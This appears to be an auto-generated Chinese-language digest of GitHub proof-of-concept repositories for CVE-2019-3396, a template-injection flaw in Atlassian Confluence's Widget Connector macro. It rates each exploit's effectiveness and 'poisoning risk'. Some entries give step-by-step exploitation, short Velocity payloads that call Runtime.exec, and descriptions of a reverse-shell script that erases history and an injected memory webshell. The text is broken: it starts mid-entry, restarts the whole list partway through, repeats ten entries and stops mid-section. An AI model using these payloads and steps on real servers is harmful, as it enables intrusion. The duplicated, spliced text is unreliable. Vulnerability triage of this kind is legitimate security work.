    *   `nc.py`：一个Python脚本，用于建立反向连接shell。该脚本尝试连接到攻击者指定的IP地址和端口，然后将标准输入、输出和错误重定向到socket，最后使用pty.spawn启动一个shell。
    *   `README.md`：仅包含漏洞ID，无实际利用功能。

2.  **利用方式：**
    攻击者首先需要确定目标Confluence Server存在该漏洞。然后，攻击者需要构造一个包含恶意Velocity模板的请求，将`cmd.vm`中的模板内容嵌入到Widget Connector宏中，并设置`$cmd`变量为需要执行的命令。如果需要反向连接，则`$cmd`变量设置为执行`nc.py`脚本。攻击者需要在自己的服务器上监听指定的端口。当Confluence Server解析该恶意请求时，会执行其中的Velocity模板代码，从而执行攻击者指定的系统命令或反向连接。

3.  **有效性：**
    根据漏洞库信息和搜索结果，该漏洞利用POC是有效的。搜索结果中存在多个分析和利用示例，以及利用该漏洞传播恶意软件的案例。提供的`cmd.vm`代码是典型的Velocity模板注入payload，可以执行任意命令。

4.  **投毒风险：**
    `nc.py`脚本尝试清除和禁用历史记录，这可能是为了隐藏攻击痕迹。此外，需要手动设定IP地址与端口，存在一定的部署成本，不太利于大规模传播。因此，该仓库的整体投毒风险较低，大约为10%。这种投毒风险主要来自于攻击者可以修改nc.py或者cmd.vm文件，嵌入后门代码，一旦成功执行，会直接暴露服务器，但是这种添加的成本较高,收益相对较低。

**项目地址:** [am6539/CVE-2019-3396](https://github.com/am6539/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #10

**来源**: [CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md](../2019/CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前 (6.6.x修复版本), 6.7.0 到 6.12.3 之前 (6.12.x修复版本), 6.13.0 到 6.13.3 之前 (6.13.x修复版本), 以及 6.14.0 到 6.14.2 之前 (6.14.x修复版本)

**利用条件:** 需要能够访问Confluence服务器并利用Widget Connector宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板语言执行任意代码。漏洞利用代码 `rce.vm` 使用了 Velocity 模板注入，通过反射获取 `java.lang.Runtime` 类，然后调用 `exec` 方法来执行命令。在这个例子中，执行的是 `calc.exe`，这是一个用于测试的payload，实际应用中可以替换为任意命令。根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用是有效的。根据搜索结果，该漏洞已被积极利用，攻击者利用该漏洞传播恶意软件，例如 Gandcrab 勒索软件和加密货币挖矿恶意软件。提供的POC代码非常直接，只包含简单的RCE代码，不存在隐藏的投毒代码。利用方式是通过构造恶意请求，在Widget Connector宏中使用恶意的Velocity模板代码，从而实现远程代码执行。

**项目地址:** [dothanthitiendiettiende/CVE-2019-3396](https://github.com/dothanthitiendiettiende/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #11

**来源**: [CVE-2019-3396-jas502n_CVE-2019-3396.md](../2019/CVE-2019-3396-jas502n_CVE-2019-3396.md)

# CVE-2019-3396

> 📦 该CVE有 **21** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md](../2019/CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 目标Confluence服务器存在Widget Connector宏，且未进行身份验证即可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用服务器端模板注入漏洞执行任意代码。

**有效性：**
提供的POC代码看起来是有效的。漏洞库信息和搜索结果都表明该漏洞已经被广泛利用，并且有可用的POC代码。POC代码通过构造包含恶意Velocity模板的请求，发送到 Confluence 服务器的 `/rest/tinymce/1/macro/preview` 接口，从而触发模板注入。

**投毒风险：**
代码主要功能是利用Velocity模板注入执行命令。其中使用了一个FTP服务器来托管payload，这是一种常见的绕过防火墙或上传限制的方法。该ruby脚本代码的主要功能是利用该漏洞，未发现明显的恶意代码或后门，但是代码中存在远程下载payload的行为，如果payload被替换，则存在一定的风险, 评估投毒风险为10%。

**利用方式：**
1.  攻击者首先需要找到存在漏洞的Confluence服务器。
2.  攻击者需要搭建一个FTP服务器，用于托管恶意Velocity模板。
3.  攻击者构造一个包含恶意Velocity模板的HTTP POST请求，发送到Confluence服务器的`/rest/tinymce/1/macro/preview`接口。该请求利用了 Widget Connector 宏的模板注入漏洞。
4.  Confluence服务器解析恶意Velocity模板，执行攻击者指定的命令，从而实现远程代码执行。

**综上所述，该漏洞的利用有效性高，存在一定的投毒风险。攻击者可以利用该漏洞在Confluence服务器上执行任意代码。**

**项目地址:** [0xNinjaCyclone/cve-2019-3396](https://github.com/0xNinjaCyclone/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #2

**来源**: [CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md](../2019/CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md)

## CVE-2019-3396_Confluence Widget Connector Macro SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者实现路径遍历和远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前, 6.7.0 至 6.12.3 之前, 6.13.0 至 6.13.3 之前, 以及 6.14.0 至 6.14.2 之前

**利用条件:** 需要目标系统存在漏洞版本的Confluence服务器，如果是RCE，可能需要合法的用户session。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以利用此漏洞进行路径遍历和远程代码执行。漏洞利用方式有两种：

1. **路径遍历（文件读取）：** 攻击者可以利用`_template`参数，通过构造恶意的路径，读取服务器上的任意文件或目录。此方式无需认证。

2. **远程代码执行（RCE）：** 攻击者可以上传一个包含恶意Velocity模板的文件到服务器，然后利用该漏洞从本地文件系统加载该模板，从而执行任意代码。此方式需要一个有效的用户session。该POC代码首先尝试找到用户的个人空间，如果不存在则创建，然后上传包含payload的模板文件，最后利用漏洞执行命令。

**关于投毒风险：**虽然代码看起来是直接利用漏洞，但仍存在一定的投毒风险（约10%）。

*   **依赖性风险：** 该脚本依赖于外部库（例如 `requests`）。如果攻击者控制了这些库的源或使用了被污染的库，则可能引入恶意代码。
*   **Payload风险：** 上传的Velocity模板payload可能被修改以执行未经授权的操作，或者被用于在受害者系统上安装恶意软件。
*   **后门风险：** 虽然该POC的目的是利用漏洞，但如果代码被恶意修改，可以在上传的模板中包含后门，允许攻击者在漏洞修复后仍然可以访问系统。

因此，在使用该POC时，建议仔细审查代码，确保所使用的库是可信的，并对上传的payload进行严格的安全评估。此外，还应监控Confluence服务器的行为，以检测任何可疑活动。

**项目地址:** [46o60/CVE-2019-3396_Confluence](https://github.com/46o60/CVE-2019-3396_Confluence)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #3

**来源**: [CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md](../2019/CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入宏内容

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意宏内容，实现任意代码执行。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC是有效的。漏洞库信息明确指出该漏洞允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。搜索引擎结果中也提及了该漏洞被用于传播恶意软件，例如加密货币挖矿程序和Gandcrab勒索软件。提供的Java代码是一个典型的Java内存马，通过ServletRequestListener注入，劫持请求，从而实现RCE。

**投毒风险：**
该POC代码本身就是一个用于植入内存马的恶意代码。投毒风险的评估主要是判断作者是否在内存马本身之外，还加入了其他的恶意行为。在给定的代码片段中，我们可以看到有尝试写入错误信息到`/tmp/success-error-2`的逻辑，如果攻击者能够控制写入的文件路径，那么这将是一个潜在的投毒点。但是总体而言，这段代码的主要功能是内存马注入，额外的恶意行为并不明显。因此，初步判断投毒风险较低。如果代码仓库中有其他编译后的类或者配置文件，可能会包含更多的投毒行为，但是仅凭这段代码，投毒的可能性为10%。

**利用方式：**
1.  **利用入口：** 利用Confluence的Widget Connector宏插入恶意Velocity模板代码。
2.  **SSTI Payload：** 构造包含恶意代码的Velocity模板Payload。常见的Payload用于执行系统命令，例如：`{code}${#req = facotry.getObject().getClass().forName('javax.servlet.http.HttpServletRequest').getMethod('getRuntime',null).invoke(null,null).exec('whoami')}`
3.  **内存马注入 (POC)：**
    *   该POC代码的目的是将一个恶意的ServletRequestListener注册到Confluence的Servlet容器中。
    *   它首先尝试找到Confluence应用使用的ClassLoader，这通常需要遍历线程，找到包含特定名称的线程（如`hz.confluence.scheduled.thread`）。
    *   然后，它利用反射获取StandardContext，这是Servlet容器的核心组件。
    *   接着，它创建一个实现了ServletRequestListener接口的动态代理，并将其实例注册到StandardContext中。
    *   当有新的HTTP请求到达时，代理的invoke方法会被调用，执行`backDoor`方法（在给定的代码片段中未完整给出）。`backDoor`方法很可能会从请求中提取命令并执行，从而实现远程代码执行。

总而言之，该漏洞利用方式是先通过SSTI漏洞注入恶意代码，然后通过植入内存马的方式维持控制。


**项目地址:** [Avento/CVE-2019-3396-Memshell-for-Behinder](https://github.com/Avento/CVE-2019-3396-Memshell-for-Behinder)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #4

**来源**: [CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md](../2019/CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md)

## CVE-2019-3396-Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server and Data Center

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，且服务器版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是一个影响Atlassian Confluence Server和Data Center的服务器端模板注入漏洞。该漏洞存在于Widget Connector宏中，允许未经身份验证的远程攻击者通过构造恶意的请求，执行任意代码。 

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、已被积极利用的漏洞，存在公开的PoC（Proof of Concept）代码。多个安全厂商（如Rapid7、Trend Micro等）都发布了关于该漏洞的分析和利用的报告。提供的PoC代码 `README.md` 文件表明该漏洞可以通过Velocity模板注入实现。虽然只提供了一个简单的 `README.md` 文件，但根据搜索结果，存在多个可用的PoC利用代码。

**投毒风险：**
提供的漏洞利用代码仅包含一个 `README.md` 文件，描述了漏洞名称。从现有文件本身来看，不存在明显的恶意代码。 但是，如果从其他源获取利用代码，则存在潜在的投毒风险。攻击者可能会在PoC中添加恶意功能，例如安装后门、窃取凭据或进行其他未经授权的活动。因此，在使用任何第三方提供的PoC代码之前，务必进行彻底的安全审查。 投毒风险估计为10%，主要是考虑到从不可信来源获取PoC的潜在风险。

**利用方式：**
漏洞的利用方式是通过在Confluence页面的Widget Connector宏中注入恶意的Velocity模板代码。当Confluence服务器渲染包含恶意代码的页面时，会执行该代码，从而允许攻击者执行任意命令。

1.  **找到存在Widget Connector宏的Confluence页面。**
2.  **构造包含恶意Velocity模板代码的请求。**
3.  **将请求发送到Confluence服务器。**
4.  **服务器执行恶意代码，实现远程代码执行。**

攻击者可以利用此漏洞执行任意系统命令，读取或修改敏感数据，或完全控制Confluence服务器。 搜索结果显示，该漏洞已被用于传播加密货币挖矿恶意软件和Gandcrab勒索软件。

**项目地址:** [HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection](https://github.com/HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #5

**来源**: [CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md](../2019/CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md)

## CVE-2019-3396-Atlassian Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Widget Connector宏开启且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 存在于 Atlassian Confluence Server 的 Widget Connector 宏中，由于服务端模板注入漏洞，攻击者可以通过构造恶意的 Velocity 模板代码，在 Confluence 服务器上执行任意命令。从提供的POC代码来看, `test.vm` 和 `test2.vm` 文件包含了利用 Velocity 模板引擎执行命令的代码。它们通过 `java.lang.Runtime` 类来执行系统命令，并读取命令执行结果。利用方式是，构造包含恶意Velocity代码的请求发送给Confluence服务器，服务器在渲染包含Widget Connector宏的页面时，会执行恶意代码，从而实现远程代码执行。根据搜索结果,该漏洞被广泛利用, 存在多种PoC和exp.

 **有效性:**  POC代码有效,因为它使用了Velocity模板语言来执行命令.通过getRuntime方法可以执行任意命令。

**投毒风险:** 仓库中主要包含用于漏洞验证和利用的Velocity模板代码，没有发现明显的恶意或后门代码，因此投毒风险较低。

**利用方式:**

1.  **定位漏洞点:** 确定目标Confluence服务器版本在受影响范围内，且启用了Widget Connector宏。
2.  **构造恶意请求:**  构建包含恶意Velocity模板代码的HTTP请求，该代码利用 `java.lang.Runtime` 执行系统命令。
3.  **发送请求:**  将构造好的请求发送给Confluence服务器。攻击者需要找到一个页面或接口，该页面或接口允许通过Widget Connector宏插入并渲染Velocity模板。
4.  **执行命令:** Confluence服务器解析并执行Velocity模板代码，从而在服务器上执行攻击者指定的命令。
5.  **获取结果:**  攻击者可以通过读取命令执行的输出来获取敏感信息，或者执行其他恶意操作。

**项目地址:** [JonathanZhou348/CVE-2019-3396TEST](https://github.com/JonathanZhou348/CVE-2019-3396TEST)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #6

**来源**: [CVE-2019-3396-PetrusViet_cve-2019-3396.md](../2019/CVE-2019-3396-PetrusViet_cve-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector 远程代码执行

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.12 之前的所有 6.6.x 版本；6.7.0 到 6.12.3 之前的所有 6.12.x 版本；6.13.0 到 6.13.3 之前的所有 6.13.x 版本；6.14.0 到 6.14.2 之前的所有 6.14.x 版本

**利用条件:** 需要目标Confluence实例存在Widget Connector宏且版本在受影响范围内，且允许用户编辑页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中，允许未经身份验证的远程攻击者通过服务器端模板注入执行任意代码。攻击者可以通过构造包含恶意 Velocity 模板代码的请求，利用 Widget Connector 宏中的漏洞执行操作系统命令。根据漏洞库信息和搜索结果，该漏洞已被广泛利用，存在多种PoC。提供的漏洞利用代码是一个用于调试和分析漏洞的开发环境搭建指南，没有直接提供可用于攻击的有效payload，但可以辅助理解漏洞原理和构建利用代码。

**有效性评估：** 漏洞有效性高，因为漏洞库信息和搜索结果均表明该漏洞已被公开披露并被广泛利用。

**投毒风险评估：** 代码仓库的主要目的是提供一个本地调试和分析漏洞的环境，而不是直接提供一个用于攻击的利用脚本。虽然不能完全排除作者在构建环境中隐藏恶意代码的可能性，但考虑到代码仓库的内容主要是配置和调试指南，直接投毒的可能性较低。因此，投毒风险估计为 10%。风险主要来自于用户在搭建调试环境的过程中可能引入的外部依赖或配置不当。

**利用方式分析：**

1.  **定位 Widget Connector 宏：** 在 Confluence 页面中插入一个 Widget Connector 宏。
2.  **构造恶意请求：**  构造包含恶意 Velocity 模板代码的请求，例如 `${Runtime.getRuntime().exec("command")}`，该代码会被服务器解析并执行。
3.  **发送请求：** 将构造好的请求发送到 Confluence 服务器。请求可能包含在 Widget Connector 宏的 URL 参数或其他相关字段中。
4.  **执行代码：** Confluence 服务器在处理包含恶意模板代码的 Widget Connector 宏时，会执行其中的代码，导致远程代码执行。

从搜索结果来看，攻击者利用该漏洞传播恶意软件（如加密货币矿工和勒索软件）的情况较为普遍。

**项目地址:** [PetrusViet/cve-2019-3396](https://github.com/PetrusViet/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #7

**来源**: [CVE-2019-3396-W2Ning_CVE-2019-3396.md](../2019/CVE-2019-3396-W2Ning_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Widget-Connector-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Server实例存在Widget Connector宏，且版本在受影响范围内。无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Atlassian Confluence Server的Widget Connector宏中，由于对用户输入过滤不严格，导致攻击者可以通过构造恶意的Velocity模板代码，实现服务器端模板注入(SSTI)，进而执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2019-3396是一个已知的且被广泛利用的漏洞。漏洞利用代码中提供了多个`.vm`文件，这些是Velocity模板文件，用于执行任意命令或获取服务器信息。`cmd.vm`和`cmd2.vm`用于执行命令，而`test.vm`用于获取系统属性。

根据提供的漏洞利用代码，`cmd.vm` 和 `cmd2.vm` 这两个文件利用 `java.lang.Runtime.getRuntime().exec()` 执行任意命令。`test.vm` 获取系统属性。这些代码与公开的漏洞利用信息相符，表明提供的POC代码有效。

**投毒风险分析：**

提供的漏洞利用代码主要包含Velocity模板文件(`.vm`)，以及一些jspx和aspx文件。Velocity模板文件用于服务器端模板注入，主要目的是执行命令或获取系统信息，本身不具备明显的投毒特征。
*   `cmd.vm` 和 `cmd2.vm`: 用于远程命令执行，直接利用了漏洞，不包含投毒代码。
*   `test.vm`: 用于获取系统属性，例如用户目录，操作系统等，不包含投毒代码。
*   `test.aspx` (C#): 通过Session传递密钥，然后使用RijndaelManaged算法进行解密，加载并执行，这段代码有作为webshell的潜力，但是它需要一个配合的加密后的payload才能生效，因此它的风险在于后续的payload。投毒风险较低。
*   `test.jspx`: 通过Session传递密钥，然后使用AES算法进行解密，加载并执行，这段代码有作为webshell的潜力，需要配合加密后的payload，因此它的风险在于后续的payload。投毒风险较低。

总体来看，投毒风险主要来源于`test.aspx`和`test.jspx` 潜在的后门风险，需要配合加密的payload才能触发。如果后续使用了被篡改的Payload可能会存在投毒行为,因此总体投毒风险评估为10%。

**利用方式：**

1.  **漏洞入口：**  利用Confluence Server中Widget Connector宏。
2.  **构造恶意Velocity模板：**  构造包含恶意代码的Velocity模板，例如利用`java.lang.Runtime.getRuntime().exec()`执行任意命令。
3.  **发送Payload：**  将构造好的恶意Velocity模板代码作为Widget Connector宏的参数发送给Confluence Server。
4.  **远程代码执行：**  Confluence Server解析Velocity模板时，执行其中的恶意代码，实现远程代码执行。

**项目地址:** [W2Ning/CVE-2019-3396](https://github.com/W2Ning/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #8

**来源**: [CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md](../2019/CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro SSTI RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入（SSTI）导致远程代码执行（RCE）

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致完全控制Confluence服务器

**影响版本:** 受影响版本包括：6.6.0-6.6.11, 6.7.0-6.12.2, 6.13.0-6.13.2, 6.14.0-6.14.1

**利用条件:** 需要能够向Confluence服务器发送HTTP请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而完全控制Confluence服务器。 

**有效性:** 提供的POC代码有效。参考Rapid7和Exploit-DB的链接，都有公开的利用代码。POC代码 `RCE_exp.py` 使用 `requests` 库发送恶意构造的POST请求到 `/rest/tinymce/1/macro/preview` 接口，通过修改 `_template` 参数，注入Velocity模板代码，从而执行任意命令。

**投毒风险:**  代码仓库中的 `RCE_exp.py` 和 `cmd.vm` 看起来是标准的漏洞利用代码。`cmd.vm` 文件是Velocity模板代码，负责执行命令。`RCE_exp.py` 负责构造和发送HTTP请求，以及从响应中提取结果。没有发现明显的恶意代码或者后门，投毒的可能性较低。

**利用方式:**

1.  **漏洞原理：** Widget Connector宏允许用户在Confluence页面中嵌入来自外部源的内容。由于对用户提供的URL参数过滤不足，攻击者可以通过构造恶意的URL，触发服务器端模板注入。
2.  **利用步骤：**
    a.  准备一个包含恶意Velocity模板代码的文件（`cmd.vm`）。该文件包含执行命令的代码。
    b.  将 `cmd.vm` 文件放置在一个可以通过FTP或者HTTPS协议访问的服务器上。
    c.  修改 `RCE_exp.py` 脚本中的 `filename` 变量，指向 `cmd.vm` 文件的URL。
    d.  运行 `RCE_exp.py` 脚本，指定Confluence服务器的URL和要执行的命令。
    e.  脚本会发送包含恶意URL的POST请求到Confluence服务器。
    f.  Confluence服务器解析恶意URL，执行Velocity模板代码，从而执行攻击者指定的命令。
3.  **影响：** 成功利用此漏洞可以导致远程代码执行，攻击者可以获取Confluence服务器的完全控制权限，从而窃取敏感数据、篡改页面内容或者进行其他恶意活动。

**结论:**
此漏洞的POC代码有效，且利用方式相对简单，可以通过公开的POC代码进行验证。虽然搜索结果显示存在投毒的情况，但提供的代码中未发现明显的投毒迹象。此漏洞危害严重，需要及时修复。

**项目地址:** [Yt1g3r/CVE-2019-3396_EXP](https://github.com/Yt1g3r/CVE-2019-3396_EXP)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #9

**来源**: [CVE-2019-3396-am6539_CVE-2019-3396.md](../2019/CVE-2019-3396-am6539_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本: 6.6.12之前 (6.6.x修复版本); 6.7.0 到 6.12.3之前 (6.12.x修复版本); 6.13.0 到 6.13.3之前 (6.13.x修复版本); 6.14.0 到 6.14.2之前 (6.14.x修复版本)

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且未打补丁，攻击者需要能够访问Confluence Server的网络。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而实现远程代码执行。根据提供的漏洞利用代码，利用方式如下：

1.  **漏洞利用代码分析：**
    *   `cmd.vm`：包含一个Velocity模板，该模板利用java.lang.Runtime类执行系统命令。变量`$cmd`需要预先设置，然后注入到Velocity模板中。
    *   `nc.py`：一个Python脚本，用于建立反向连接shell。该脚本尝试连接到攻击者指定的IP地址和端口，然后将标准输入、输出和错误重定向到socket，最后使用pty.spawn启动一个shell。
    *   `README.md`：仅包含漏洞ID，无实际利用功能。

2.  **利用方式：**
    攻击者首先需要确定目标Confluence Server存在该漏洞。然后，攻击者需要构造一个包含恶意Velocity模板的请求，将`cmd.vm`中的模板内容嵌入到Widget Connector宏中，并设置`$cmd`变量为需要执行的命令。如果需要反向连接，则`$cmd`变量设置为执行`nc.py`脚本。攻击者需要在自己的服务器上监听指定的端口。当Confluence Server解析该恶意请求时，会执行其中的Velocity模板代码，从而执行攻击者指定的系统命令或反向连接。

3.  **有效性：**
    根据漏洞库信息和搜索结果，该漏洞利用POC是有效的。搜索结果中存在多个分析和利用示例，以及利用该漏洞传播恶意软件的案例。提供的`cmd.vm`代码是典型的Velocity模板注入payload，可以执行任意命令。

4.  **投毒风险：**
    `nc.py`脚本尝试清除和禁用历史记录，这可能是为了隐藏攻击痕迹。此外，需要手动设定IP地址与端口，存在一定的部署成本，不太利于大规模传播。因此，该仓库的整体投毒风险较低，大约为10%。这种投毒风险主要来自于攻击者可以修改nc.py或者cmd.vm文件，嵌入后门代码，一旦成功执行，会直接暴露服务器，但是这种添加的成本较高,收益相对较低。

**项目地址:** [am6539/CVE-2019-3396](https://github.com/am6539/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #10

**来源**: [CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md](../2019/CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前 (6.6.x修复版本), 6.7.0 到 6.12.3 之前 (6.12.x修复版本), 6.13.0 到 6.13.3 之前 (6.13.x修复版本), 以及 6.14.0 到 6.14.2 之前 (6.14.x修复版本)

**利用条件:** 需要能够访问Confluence服务器并利用Widget Connector宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板语言执行任意代码。漏洞利用代码 `rce.vm` 使用了 Velocity 模板注入，通过反射获取 `java.lang.Runtime` 类，然后调用 `exec` 方法来执行命令。在这个例子中，执行的是 `calc.exe`，这是一个用于测试的payload，实际应用中可以替换为任意命令。根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用是有效的。根据搜索结果，该漏洞已被积极利用，攻击者利用该漏洞传播恶意软件，例如 Gandcrab 勒索软件和加密货币挖矿恶意软件。提供的POC代码非常直接，只包含简单的RCE代码，不存在隐藏的投毒代码。利用方式是通过构造恶意请求，在Widget Connector宏中使用恶意的Velocity模板代码，从而实现远程代码执行。

**项目地址:** [dothanthitiendiettiende/CVE-2019-3396](https://github.com/dothanthitiendiettiende/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #11

**来源**: [CVE-2019-3396-kh4sh3i_CVE-2019-3396.md](../2019/CVE-2019-3396-kh4sh3i_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Server-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行

**影响版本:** 受影响版本：6.6.12之前, 6.7.0到6.12.3之前, 6.13.0到6.13.3之前, 6.14.0到6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入恶意模板

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是一个存在于Atlassian Confluence Server中的服务器端模板注入漏洞。该漏洞位于Widget Connector宏中，允许未经身份验证的远程攻击者利用Velocity模板引擎的缺陷执行任意代码。攻击者可以通过构造恶意的Widget Connector宏参数，将恶意Velocity模板注入到服务器端，从而执行任意系统命令。

**有效性评估：**

